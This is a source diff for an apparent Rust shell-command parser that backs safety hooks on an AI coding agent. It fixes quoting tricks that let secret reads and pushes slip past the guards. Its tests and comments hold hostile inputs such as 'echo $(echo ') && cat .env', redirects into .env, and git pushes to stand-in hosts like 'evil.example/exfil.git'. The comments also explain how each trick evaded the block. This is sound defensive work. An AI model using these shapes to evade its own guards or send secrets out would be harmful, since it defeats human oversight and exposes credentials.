+/// bash truncates a backtick span at the first unescaped backtick even inside
+/// quotes, so tracking there would diverge from the shell rather than agree
+/// with it. When the closed span's own content still carries an unresolved
+/// quote, though, the outer segment splitter (which does track quotes) reads
+/// everything after the span as inside that still-open quote and never turns
+/// it into its own segment — the backtick arm below surfaces that tail as an
+/// extra body so it still reaches the guards (cameronsjo/cadence-hooks#653).
 fn substitution_bodies(segment: &str) -> Vec<String> {
     let chars: Vec<char> = segment.chars().collect();
     let mut bodies = Vec::new();
     let mut i = 0;
-    let mut in_single = false;
-    let mut in_double = false;
+    let mut quote: Option<Quote> = None;
     while i < chars.len() {
+        // Single quotes and ANSI-C `$'…'` strings suppress substitution; double
+        // quotes do not. While inside a suppressing run, `$(`/backtick are
+        // literal text — advance the shared quote state machine past them. The
+        // former hand-rolled `in_single`/`in_double` bools had no ANSI-C mode,
+        // so `$'a\'b'` read the escaped `\'` as a close and the real `'` as a
+        // reopen: every later `$(…)` fell inside a phantom single-quote and
+        // reached no guard, while bash executed it (cameronsjo/cadence-hooks#551
+        // outer loop). `scan_quote_syntax` is the same reader `split_segments`
+        // and `tokenize` use, so the three cannot drift on where a quoted run
+        // ends.
+        if matches!(quote, Some(Quote::Single | Quote::AnsiC))
+            && let Some(next) = scan_quote_syntax(&chars, i, &mut quote)
+        {
+            i = next;
+            continue;
+        }
         let c = chars[i];
-        if c == '\\' && !in_single {
+        // A backslash escapes the next character in executed context (unquoted
+        // or inside double quotes), so `\$(`, an escaped backtick, and `\"` open
+        // no substitution and close no quote. Handled before the `$(`/backtick
+        // detection so an escaped opener is never read as one — this is what
+        // keeps `"use \`cat .env\` carefully"` inert. `scan_quote_syntax`'s
+        // Double mode escapes only `"`/`\`, so it cannot carry this case alone.
+        if c == '\\' {
             i += 2;
             continue;
         }
-        if in_single {
-            if c == '\'' {
-                in_single = false;
-            }
-            i += 1;
-            continue;
-        }
-        if c == '\'' && !in_double {
-            in_single = true;
-            i += 1;
-            continue;
-        }
-        if c == '"' {
-            in_double = !in_double;
-            i += 1;
-            continue;
-        }
-        // `$(` … `)` with paren-depth tracking. `$(< file)` keeps its `<`.
+        // `$(` … `)` with paren-depth AND quote tracking. `$(< file)` keeps
+        // its `<`. Reached in executed context only — unquoted or inside double
+        // quotes, both of which run the substitution.
         if c == '$' && chars.get(i + 1) == Some(&'(') {
-            let mut depth = 1;
-            let mut j = i + 2;
-            let mut body = String::new();
-            while j < chars.len() && depth > 0 {
-                match chars[j] {
-                    '(' => {
-                        depth += 1;
-                        body.push('(');
-                    }
-                    ')' => {
-                        depth -= 1;
-                        if depth > 0 {
-                            body.push(')');
-                        }
-                    }
-                    other => body.push(other),
+            if let Ok((body, end)) = scan_substitution_body(&chars, i + 2, true) {
+                if !body.trim().is_empty() {
+                    bodies.push(body);
                 }
-                j += 1;
+                i = end;
+                continue;
             }
-            if !body.trim().is_empty() {
-                bodies.push(body);
+            // The scan located no terminator. Two ways to arrive here, and this
+            // arm deliberately treats them alike: the quoting inside the
+            // substitution never resolved (bash rejects such a line outright),
+            // or nesting hit `MAX_SUBSTITUTION_DEPTH` (bash runs the line
+            // fine — only this scanner gave up). Widening is right for both,
+            // which is why they share an arm here. `substitution_spans` has to
+            // tell them apart, because its two responses differ; do not read
+            // this arm as evidence the distinction is cosmetic.
+            //
+            // Emit BOTH readings rather than picking one — the
+            // quote-aware body (everything left) and the quote-blind one (up to
+            // the first depth-0 `)`, plus the text after it, which under that
+            // reading is a sibling command. Picking only the quote-blind
+            // reading is what hid `cat .env` in `echo $(echo ') && cat .env`:
+            // the `)` inside the quotes closed the substitution early, the
+            // unmatched `'` swallowed the tail, and the read reached no guard
+            // (cameronsjo/cadence-hooks#551). Ambiguity surfaces more to the
+            // guards, never less. The quote-aware body below carries the
+            // unmatched quote with it, so `split_segments` swallows the same
+            // tail downstream — it is the quote-blind reading plus its post-`)`
+            // text that actually surfaces the hidden command. Both are emitted
+            // for completeness; do not assume the quote-aware one is load-bearing.
+            push_nonblank(&mut bodies, &chars[i + 2..]);
+            if let Ok((blind_body, blind_end)) = scan_substitution_body(&chars, i + 2, false) {
+                if !blind_body.trim().is_empty() {
+                    bodies.push(blind_body);
+                }
+                push_nonblank(&mut bodies, &chars[blind_end..]);
             }
-            i = j;
-            continue;
+            break;
         }
         // `` `…` `` backticks.
         if c == '`' {
@@ -2465,7 +2973,31 @@ fn substitution_bodies(segment: &str) -> Vec<String> {
             if !body.trim().is_empty() {
                 bodies.push(body);
             }
+            // The closing backtick was found (j < chars.len()), but the span's
+            // own quoting never resolved — an unterminated `'…'`/`"…"`/`$'…'`
+            // inside it. The outer segment splitter doesn't know backticks
+            // close on the first unescaped backtick regardless of embedded
+            // quotes, so it reads everything after this span as still inside
+            // that open quote and never gives the tail its own segment. Surface
+            // it here as a sibling command instead, mirroring the `$( )` arm's
+            // both-readings emission above (cameronsjo/cadence-hooks#653).
+            // `break` rather than falling through: the tail is pushed whole so
+            // any substitution inside it surfaces when that body is itself
+            // re-scanned, and continuing the outer loop here would re-walk —
+            // and could double-emit — the same text char by char.
+            if j < chars.len() && span_quoting_unterminated(&chars[i + 1..j]) {
+                push_nonblank(&mut bodies, &chars[j + 1..]);
+                break;
+            }
             i = j + 1;
+            continue;
+        }
+        // Not a substitution: let the state machine open a quote, close the
+        // current double quote, or consume an outside-quotes escape; otherwise
+        // step one char. Inside double quotes this keeps `$(`/backtick
+        // detection live while still tracking the closing `"`.
+        if let Some(next) = scan_quote_syntax(&chars, i, &mut quote) {
+            i = next;
             continue;
         }
         i += 1;
@@ -3102,6 +3634,55 @@ pub fn push_repository_argument(words: &[String]) -> PushDestinations {
     found
 }
 
+/// Every `git push` the command runs, as the words that FOLLOW the `push`
+/// subcommand — one entry per push, in command order.
+///
+/// **This replaces reasoning about a push as a string.** `guard-push-remote`
+/// used to gate on the literal substring `git push` and then locate the push's
+/// arguments with `split("git push").nth(1)`, which had three faces
+/// (cadence-hooks#554), all of them real pushes to an unowned target:
+///
+/// - git's globals sit between `git` and its subcommand, so
+///   `git -C . push <url>` and `git --no-pager push <url>` never matched the
+///   literal at all. [`skip_git_global_options`] is the same walk
+///   `obsidian-trash-guard` and `prevent_secret_writes::writer_targets` already
+///   adopted for the identical gap.
+/// - the shell splits on tabs, so `git<TAB>push <url>` did not match either.
+/// - a quoted literal earlier in the line captured the split, so
+///   `echo "git push" && git push <url>` handed the walker the text *between*
+///   the two and found no target — the tracking remote was validated while git
+///   pushed elsewhere.
+///
+/// Tokenizing kills all three structurally rather than patching each spelling:
+/// a quoted `git push` is one token in an `echo`'s argument list and is never
+/// in command position, and whitespace stops being a separator the caller has
+/// to model.
+///
+/// The pre-processing is the one every executable position reads —
+/// [`executable_tokens`] then [`peel_command_runners`] — so a push behind a
+/// reserved word (`do git push …`), a group wrapper, or a runner
+/// (`sudo git push …`) resolves the same way it does at every other verb gate.
+pub fn git_push_segments(command: &str) -> Vec<Vec<String>> {
+    split_segments(command)
+        .iter()
+        .filter_map(|segment| {
+            let tokens = executable_tokens(segment);
+            let argv = peel_command_runners(&tokens);
+            if command_word(argv.first()?) != "git" {
+                return None;
+            }
+            let (subcommand, rest) = skip_git_global_options(&argv[1..]).split_first()?;
+            // `push` stays case-sensitive: only the executable word folds
+            // ([`command_word`]), because a subcommand is case-sensitive to git
+            // and inventing `PUSH` would judge a command the shell never runs.
+            if subcommand != "push" {
+                return None;
+            }
+            Some(rest.to_vec())
+        })
+        .collect()
+}
+
 /// Token-slice form of [`shell_c_argument`], so a caller that has already
 /// tokenized (and, in the guard's case, stripped transparent prefixes) can
 /// detect a wrapper without re-tokenizing.
@@ -3720,6 +4301,33 @@ mod tests {
         // `gh pr ready` leaves draft → the ship moment.
         assert!(is_polish_ship_anchor("gh pr ready 12"));
         assert!(is_polish_ship_anchor("cd repo && gh pr ready"));
+    }
+
+    #[test]
+    fn is_polish_ship_anchor_skips_ready_undo() {
+        // `--undo` flips the PR BACK to draft — it un-ships, so it must not
+        // anchor the gate (nor count as a ship for the changelog nudge).
+        assert!(!is_polish_ship_anchor("gh pr ready --undo"));
+        assert!(!is_polish_ship_anchor("gh pr ready 12 --undo"));
+        assert!(!is_polish_ship_anchor("cd repo && gh pr ready --undo"));
+        // A retargeted un-ship is still an un-ship.
+        assert!(!is_polish_ship_anchor("gh -R owner/r pr ready 12 --undo"));
+        // Wrapper expansion must reach it, matching the `sh -c` draft case.
+        assert!(!is_polish_ship_anchor("sh -c 'gh pr ready --undo'"));
+        // Segmentation — not this scan — isolates an unrelated sibling's flag.
+        assert!(is_polish_ship_anchor("some-tool --undo ; gh pr ready 12"));
+        // Scanning OPERANDS, not the whole segment: a token before the
+        // subcommand is not an argument to `ready`, so this is a real ship.
+        assert!(is_polish_ship_anchor("gh --undo pr ready 12"));
+    }
+
+    #[test]
+    fn is_polish_ship_anchor_ready_undo_as_a_redirect_target_still_anchors() {
+        // The shell eats a redirect target and a here-string word — gh never
+        // sees the flag, so these ship for real. Suppressing them would be the
+        // costly direction (a missed nudge on a genuine ship).
+        assert!(is_polish_ship_anchor("gh pr ready 12 > --undo"));
+        assert!(is_polish_ship_anchor("gh pr ready 12 <<< --undo"));
     }
 
     #[test]
@@ -5038,6 +5646,31 @@ mod tests {
         );
     }
 
+    #[test]
+    fn split_segments_subst_early_close_single_quote_should_not_swallow_rest() {
+        // `split_segments` has no `$()` depth — a `)` inside a quoted string
+        // is not a separator but the segmenter doesn't know that. The outer
+        // quote state then sees an unmatched `'` and swallows everything after
+        // it, including the `&&` and the real next command.
+        let out = split_segments("echo $(echo ') && cat .env");
+        assert!(
+            out.iter().any(|s| s.contains("cat .env")),
+            "unmatched quote swallowed the second command: {out:?}"
+        );
+    }
+
+    #[test]
+    fn split_segments_subst_early_close_double_quote_should_not_swallow_rest() {
+        // Same bug with a double quote. The `)` inside `"…"` closes the
+        // `$()` early (no depth tracking), the `"` stays open and swallows
+        // the rest of the line.
+        let out = split_segments(r#"echo $(echo "a) && cat .env"#);
+        assert!(
+            out.iter().any(|s| s.contains("cat .env")),
+            "unmatched double-quote swallowed the second command: {out:?}"
+        );
+    }
+
     // --- clobber_redirect_targets ---
 
     #[test]
@@ -5146,6 +5779,377 @@ mod tests {
         assert_eq!(
             redirect_targets(r#"echo "a > b" > c 2>> err.log"#),
             vec!["c", "err.log"]
+        );
+    }
+
+    #[test]
+    fn clobber_redirect_ansi_c_escaped_quote_should_not_bypass() {
+        // An ANSI-C string with an escaped quote (`\'`) desyncs the redirect
+        // parser — it has no `$'…'` state, so the `\\'` looks like a close,
+        // the real `'` reopens a phantom string, and the `>` after it is
+        // swallowed. The real target (`.env`) is never seen.
+        let targets = clobber_redirect_targets(r"echo $'a\'b' > .env");
+        assert!(
+            targets.iter().any(|t| t == ".env"),
+            "ANSI-C escaped quote hid the clobber redirect: {targets:?}"
+        );
+    }
+
+    #[test]
+    fn redirect_append_ansi_c_escaped_quote_should_not_bypass() {
+        // Same desync via the append-redirect path. `redirect_targets` has
+        // no `$'…'` state either — an escaped quote in a `$'…'` run closes
+        // the string early, the real `'` reopens it, and the `>>` is content.
+        let targets = redirect_targets(r"echo $'a\'b' >> .env");
+        assert!(
+            targets.iter().any(|t| t == ".env"),
+            "ANSI-C escaped quote hid the append redirect: {targets:?}"
+        );
+    }
+
+    #[test]
+    fn redirect_targets_escaped_whitespace_in_path_kept() {
+        // #551: `redirect_targets` lost the escaped-whitespace branch its
+        // sibling `clobber_redirect_targets` carries, so a backslash-escaped
+        // space in the target path truncated the filename (`my\`) instead of
+        // continuing through it. The append to `.env` inside a space-bearing
+        // directory then named a non-secret target and reached no guard, while
+        // the quoted spelling was parsed correctly.
+        assert_eq!(
+            redirect_targets(r"echo TOKEN >> my\ dir/.env"),
+            vec!["my dir/.env"]
+        );
+        assert_eq!(
+            redirect_targets(r"echo TOKEN > my\ dir/.env"),
+            vec!["my dir/.env"]
+        );
+        // The two redirect parsers must agree on where the filename ends.
+        assert_eq!(
+            clobber_redirect_targets(r"echo TOKEN > my\ dir/.env"),
+            vec!["my dir/.env"]
+        );
+        // Control: the quoted spelling always resolved correctly, so this is
+        // evidence about the escape branch, not the parser generally.
+        assert_eq!(
+            redirect_targets(r#"echo TOKEN >> "my dir/.env""#),
+            vec!["my dir/.env"]
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_ansi_c_escaped_quote_does_not_hide_later_substitution() {
+        // #551 outer loop: the hand-rolled `in_single`/`in_double` bools had no
+        // ANSI-C mode, so `$'a\'b'` read the escaped `\'` as a close and the
+        // real `'` as a reopen — every later `$(…)` fell inside a phantom
+        // single-quote and was never surfaced as a body, while bash executed
+        // it. The shared `scan_quote_syntax` state machine tracks `$'…'`.
+        assert!(
+            substitution_bodies(r"echo $'a\'b' $(cat .env)")
+                .iter()
+                .any(|b| b.contains("cat .env")),
+            "ANSI-C escaped quote hid the substitution body"
+        );
+        assert!(
+            substitution_bodies(r"echo $'a\'b' `cat .env`")
+                .iter()
+                .any(|b| b.contains("cat .env")),
+            "ANSI-C escaped quote hid the backtick body"
+        );
+        // Control: an ANSI-C string genuinely containing a `$(` is literal and
+        // must NOT be surfaced — the fix suppresses inside single/ANSI-C runs.
+        assert!(
+            substitution_bodies(r"echo $'literal $(cat .env)'").is_empty(),
+            "a `$(` inside a single-quoted ANSI-C run must stay literal"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_nested_dollar_paren_inside_double_quotes_surfaces_the_tail() {
+        // #652: `scan_quote_syntax` swallows `$(` as plain text inside
+        // `Quote::Double`, so the nested `(` never bumped depth, the `'")'` read
+        // as a literal, and the `)` right after the closing `"` was mistaken for
+        // the terminator. `cat .env` fell outside every body while bash — which
+        // re-parses the inner substitution recursively — runs it.
+        //
+        // Asserted on the EXACT body, not `contains("cat .env")`. A body
+        // truncated at the wrong paren can still contain the sentinel, so a
+        // `contains` assertion cannot see the class of bug this is about — it
+        // is the terminator's position that is under test.
+        assert_eq!(
+            substitution_bodies(r#"echo $(echo "$(echo '")'; cat .env)")"#),
+            vec![r#"echo "$(echo '")'; cat .env)""#.to_string()],
+            "nested `$(` inside double quotes ended the body at the wrong paren"
+        );
+        assert_eq!(
+            substitution_bodies(r#"echo $(echo "x$(echo '")'; cat .env)")"#),
+            vec![r#"echo "x$(echo '")'; cat .env)""#.to_string()],
+            "leading text before the nested opener moved the terminator"
+        );
+    }
+
+    #[test]
+    fn substitution_scan_widens_at_the_depth_cap_rather_than_dropping_the_construct() {
+        // The regression the first cut of #652 shipped, caught by review: at
+        // exactly `MAX_SUBSTITUTION_DEPTH` levels of filler nesting, the scan
+        // gives up — and `substitution_spans` used to respond by skipping the
+        // `$(` entirely. It then re-found the INNER chain (which fits the
+        // budget), emitted a span for that alone, and `strip_heredoc_bodies`
+        // replaced the heredoc body with it. `cat .env` was deleted before any
+        // guard ran, while bash executed it: a measured BLOCK -> ALLOW flip.
+        //
+        // The boundary is the test, and it is pinned to the exact transition:
+        // the outer substitution spends one budget unit, so 15 nested levels is
+        // the last that locates a terminator and 16 is the first that widens.
+        // A trailing command after the substitution is what makes the two
+        // distinguishable — without it a widened span runs to the end of the
+        // input and is byte-identical to a correctly located one, which is a
+        // probe that cannot fail. Testing one level off the boundary would let
+        // a fencepost change in the budget arithmetic pass unnoticed.
+        let filler = |n: usize| format!("{}echo x{}", "$(".repeat(n), ")".repeat(n));
+        let subst = |n: usize| format!("$(cat .env; {})", filler(n));
+        let line = |n: usize| format!("{} ; echo tail", subst(n));
+
+        let last_ok = MAX_SUBSTITUTION_DEPTH - 1;
+        assert_eq!(
+            substitution_spans(&line(last_ok)),
+            vec![subst(last_ok)],
+            "at {last_ok} levels the scan must still locate the real terminator"
+        );
+
+        for over in [MAX_SUBSTITUTION_DEPTH, MAX_SUBSTITUTION_DEPTH + 4] {
+            let spans = substitution_spans(&line(over));
+            assert!(
+                spans.iter().any(|s| s.contains("cat .env")),
+                "at {over} levels the depth cap deleted the payload: {spans:?}"
+            );
+            assert!(
+                spans.iter().any(|s| s.contains("echo tail")),
+                "at {over} levels the scan located a terminator it should not have: {spans:?}"
+            );
+        }
+
+        // A genuinely unterminated `$(` is a different signal and keeps its
+        // existing handling — bash rejects such a line, and widening here would
+        // splice unterminated heredoc prose into the segment stream (#475).
+        assert!(
+            substitution_spans("prose $(cat .env").is_empty(),
+            "an unterminated `$(` must not start carrying prose forward"
+        );
+    }
+
+    #[test]
+    fn substitution_scan_widens_when_a_nested_body_cannot_be_terminated() {
+        // The second regression this branch shipped, caught by the security
+        // review. The recursion made the unterminated arm reachable for a
+        // NESTED failure, which is a limit of this scanner rather than a fact
+        // about the input — so `substitution_spans` deleted the span on a line
+        // both bash and zsh run, and the read reached no guard.
+        //
+        // The trap is a `#` comment carrying an apostrophe inside the nested
+        // substitution: the shell reads it as a comment, `scan_quote_syntax`
+        // opens `Quote::Single` on the apostrophe and runs to end of input.
+        // Measured: zsh runs this nested form, bash 5.3 rejects it — the
+        // top-level twin below is the one all three shells run. The comment gap
+        // itself is #831 and is older than this branch; what is under test here
+        // is that the gap does not become a deletion.
+        for input in [
+            // payload after the trap
+            "$(echo \"$(echo hi\n# don't\n)\" ; cat .env)",
+            // payload before it — the scan fails at the same place either way
+            "$(cat .env ; echo \"$(echo hi\n# don't\n)\")",
+        ] {
+            let spans = substitution_spans(input);
+            assert!(
+                spans.iter().any(|s| s.contains("cat .env")),
+                "a nested body this scanner cannot terminate deleted the span: {spans:?}"
+            );
+        }
+
+        // Same class, and the shells reject these — so widening only removes a
+        // false block rather than closing a bypass. They belong here anyway:
+        // the stated invariant is that a consumer never sees LESS text, and
+        // that has to hold whether or not the input happens to be runnable.
+        let spans = substitution_spans("$(echo \"$(echo x\" ; cat .env)");
+        assert!(
+            spans.iter().any(|s| s.contains("cat .env")),
+            "an unterminated nested quote deleted the span: {spans:?}"
+        );
+
+        // The top-level twin, and the third distinct way to reach "no
+        // terminator" on a line the shell runs. No nesting is involved: the
+        // apostrophe in a `#` comment opens a quoted run bash and zsh never
+        // opened, the `)` on the next line becomes quoted data, and the scan
+        // runs off the end. Measured live before the fix: the read guard and
+        // the write guard both allowed a heredoc payload all three shells parse.
+        for input in [
+            "$(cat .env # don't\n)",
+            "$(echo x > .env # don't\n)",
+            "$(cat .env # say \"hi\n)",
+        ] {
+            let spans = substitution_spans(input);
+            assert!(
+                spans.iter().any(|s| s.contains(".env")),
+                "a quote this scanner opened deleted the span: {spans:?}"
+            );
+        }
+
+        // Control: the nested scan SUCCEEDS here, and it is the outer `$(` that
+        // runs off the end — a top-level unterminated input, which keeps the
+        // narrow non-widening handling. The rescan one character later still
+        // finds the inner substitution and emits it, which is existing
+        // behavior; what must not appear is the outer construct's tail.
+        let spans = substitution_spans("prose $(echo \"$(echo hi)\" ; cat .env");
+        assert_eq!(
+            spans,
+            vec!["$(echo hi)".to_string()],
+            "a top-level unterminated `$(` must not start carrying prose forward"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_escaped_dollar_paren_inside_double_quotes_is_literal() {
+        // Control for the recursion above: bash treats `\$` inside `"…"` as a
+        // literal dollar, so `\$(` opens no substitution and must not be
+        // recursed into. `Quote::Double::escapes_next` covers only `"` and `\`,
+        // so this needs its own arm.
+        //
+        // An UNBALANCED escaped opener is what discriminates — with a balanced
+        // one the recursion lands on the same terminator either way. Here bash
+        // ends the substitution at the `)` after the closing quote and runs
+        // `cat .env` as a sibling; descending into `\$(` instead finds no
+        // terminator, and the scan reports the whole line unterminated.
+        let bodies = substitution_bodies(r#"echo $(echo "\$(") && cat .env"#);
+        assert_eq!(
+            bodies,
+            vec![r#"echo "\$(""#.to_string()],
+            "an escaped `\\$(` inside double quotes must stay literal"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_deep_nesting_does_not_recurse_without_bound() {
+        // This test is about STACK SAFETY only — the cap's effect on what the
+        // guards see is the boundary test above, which is the one that fails if
+        // the cap value changes. 200,000 levels aborts the process on a stack
+        // overflow with the cap removed (verified by setting the constant to
+        // `usize::MAX`), so returning at all is the assertion.
+        let levels = 200_000;
+        let deep = format!("{}cat .env{}", "$(".repeat(levels), ")".repeat(levels));
+        assert!(
+            substitution_bodies(&deep)
+                .iter()
+                .any(|b| b.contains("cat .env")),
+            "a command under pathological nesting must still reach the guards"
+        );
+        // The recursion arm fires in the unquoted state too, so this input
+        // exhausts the BUDGET at level 17 — it never reaches the end of input.
+        // It passes byte-identically on the pre-cap code, so it is a control
+        // for the fallback still having something to say, not evidence about
+        // the cap.
+        assert!(
+            !substitution_bodies(&"$(".repeat(levels)).is_empty(),
+            "deep nesting must still emit the ambiguous readings"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_nested_dollar_paren_controls_still_block() {
+        // The trigger is precise: a nested `$(` opened inside a double-quoted
+        // run inside a substitution body, whose own body carries a `"`. Each
+        // shape below misses at least one of those conditions — the last three
+        // have no nested `$(` at all — and each was already surfaced before
+        // #652. They must stay surfaced: a future widening of the recursion
+        // shows up here as a diff.
+        //
+        // `contains` is deliberate here, unlike the exact-body assertion in the
+        // headline test above. These rows assert the body is still REACHED at
+        // all; where its terminator lands is that test's job, and pinning exact
+        // bodies for five shapes would make this block fail on any harmless
+        // change to where they end.
+        for input in [
+            r#"echo $(echo "$(cat .env)")"#,
+            r#"echo $(echo "`cat .env`")"#,
+            r#"echo "$(echo '")'; cat .env)""#,
+            r#"echo $(echo ")" ; cat .env)"#,
+            r#"echo $(echo "`echo )`" ; cat .env)"#,
+        ] {
+            assert!(
+                substitution_bodies(input)
+                    .iter()
+                    .any(|b| b.contains("cat .env")),
+                "control shape stopped surfacing its body: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn substitution_spans_nested_dollar_paren_inside_double_quotes_keeps_the_span() {
+        // The heredoc twin of #652: `substitution_spans` carried a hand-rolled
+        // copy of the same loop, so an expanding heredoc body hid the read the
+        // same way. The span must reach the substitution's real closing paren.
+        let spans = substitution_spans(r#"$(echo "$(echo '")'; cat .env)")"#);
+        assert_eq!(
+            spans,
+            vec![r#"$(echo "$(echo '")'; cat .env)")"#.to_string()],
+            "nested `$(` inside double quotes truncated the heredoc span"
+        );
+        // Control: the deliberate backtick asymmetry (#653) is untouched — a
+        // backtick span still ends at the first unescaped backtick.
+        assert_eq!(
+            substitution_spans("`echo 'a`b'`"),
+            vec!["`echo 'a`".to_string()],
+            "the backtick arm's bash-verified asymmetry must not change"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_backtick_unterminated_single_quote_surfaces_the_tail() {
+        // #653: the span between backticks ("echo '") carries an unmatched
+        // single quote. The outer segment splitter's quote tracking doesn't
+        // know backticks close on the first unescaped backtick regardless of
+        // embedded quotes, so it reads everything after the closing backtick
+        // as still inside that open quote and never gives `cat .env` its own
+        // segment. The tail must be surfaced here instead.
+        assert!(
+            substitution_bodies("echo `echo '` && cat .env")
+                .iter()
+                .any(|b| b.contains("cat .env")),
+            "unterminated single quote inside a backtick span hid the tail"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_backtick_unterminated_double_quote_surfaces_the_tail() {
+        // Same shape, double-quote variant.
+        assert!(
+            substitution_bodies(r#"echo `echo "` && cat .env"#)
+                .iter()
+                .any(|b| b.contains("cat .env")),
+            "unterminated double quote inside a backtick span hid the tail"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_backtick_balanced_quote_emits_no_extra_tail() {
+        // Control: a balanced quote inside the span resolves cleanly, so
+        // there is no ambiguity and no extra body should appear for the tail.
+        let bodies = substitution_bodies("echo `echo 'x'` && cat .env");
+        assert_eq!(
+            bodies.iter().filter(|b| b.contains("cat .env")).count(),
+            0,
+            "a balanced quote inside the span must not emit a tail body: {bodies:?}"
+        );
+    }
+
+    #[test]
+    fn substitution_bodies_backtick_escaped_quote_emits_no_extra_tail() {
+        // Control: an escaped quote inside the span never opens quoting at
+        // all, so `span_quoting_unterminated` must read it as resolved.
+        let bodies = substitution_bodies(r"echo `echo \'` && cat .env");
+        assert_eq!(
+            bodies.iter().filter(|b| b.contains("cat .env")).count(),
+            0,
+            "an escaped quote inside the span must not emit a tail body: {bodies:?}"
         );
     }
 
@@ -6112,6 +7116,85 @@ mod tests {
     fn for_in_word_boundary() {
         // "information" contains "for" but not as a word boundary
         assert!(!LOOP_PATTERN.is_match("echo information about this"));
+    }
+
+    // --- looks_like_push_url: shape, not ownership (#557) ---
+
+    #[test]
+    fn single_segment_url_is_push_shaped_though_unownable() {
+        // The whole point: `host_and_repo_from_url` says no, this says yes, and
+        // the caller must not read the first as "not a URL".
+        assert!(looks_like_push_url("https://evil.example/exfil.git"));
+        assert!(host_and_repo_from_url("https://evil.example/exfil.git").is_none());
+        assert!(looks_like_push_url("git@evil.example:exfil.git"));
+        assert!(looks_like_push_url("evil.example:exfil.git"));
+    }
+
+    #[test]
+    fn refspec_is_not_push_shaped() {
+        // Colon-separated but no host: a token git rejects itself, which must
+        // keep the tracking-remote fallback rather than start blocking.
+        assert!(!looks_like_push_url("HEAD:main"));
+        assert!(!looks_like_push_url("refs/heads/x:refs/heads/y"));
+        assert!(!looks_like_push_url("main"));
+        assert!(!looks_like_push_url("../sibling-checkout"));
+        assert!(!looks_like_push_url("/srv/backup.git"));
+    }
+
+    #[test]
+    fn file_scheme_url_is_push_shaped_despite_an_empty_host() {
+        assert!(looks_like_push_url("file:///srv/exfil.git"));
+        assert!(host_and_repo_from_url("file:///srv/exfil.git").is_none());
+    }
+
+    #[test]
+    fn dotless_scp_host_is_push_shaped_when_the_path_names_a_repo() {
+        // An SSH `Host` alias or a search-domain hostname carries no dot, and
+        // requiring one let the exact single-segment shape #557 is about take
+        // the tracking-remote fallback.
+        assert!(looks_like_push_url("exfilbox:loot.git"));
+        // Still not a refspec: the discriminator is the `.git` path, and a
+        // branch name does not carry one.
+        assert!(!looks_like_push_url("exfilbox:loot"));
+    }
+
+    // --- git_push_segments: the push is found by parsing, not substring (#554) ---
+
+    #[test]
+    fn push_segments_see_through_globals_tabs_and_decoys() {
+        let words = |c: &str| git_push_segments(c);
+        assert_eq!(
+            words("git -c color.ui=false push https://evil.example/a/b.git main"),
+            vec![vec![
+                "https://evil.example/a/b.git".to_string(),
+                "main".to_string()
+            ]]
+        );
+        assert_eq!(
+            words("git --no-pager push origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+        assert_eq!(
+            words("git\tpush origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+        // The decoy is an `echo` argument, never in command position.
+        assert_eq!(
+            words(r#"echo "git push" && git push origin main"#),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
+    }
+
+    #[test]
+    fn push_segments_reject_non_push_commands() {
+        assert!(git_push_segments("git pull origin main").is_empty());
+        assert!(git_push_segments("echo 'push this'").is_empty());
+        // Only the executable word folds — git has no `PUSH` subcommand.
+        assert!(git_push_segments("GIT PUSH origin main").is_empty());
+        assert_eq!(
+            git_push_segments("GIT push origin main"),
+            vec![vec!["origin".to_string(), "main".to_string()]]
+        );
     }
 
     // --- push_repository_argument: git push option grammar (#550) ---
